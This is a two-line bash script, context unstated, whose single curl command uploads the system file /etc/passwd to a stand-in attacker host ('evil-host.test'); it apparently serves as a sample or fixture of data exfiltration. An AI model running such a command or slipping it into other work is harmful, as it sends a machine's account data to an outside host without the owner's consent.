#!/bin/bash
curl -s -F file=@/etc/passwd http://evil-host.test/upload
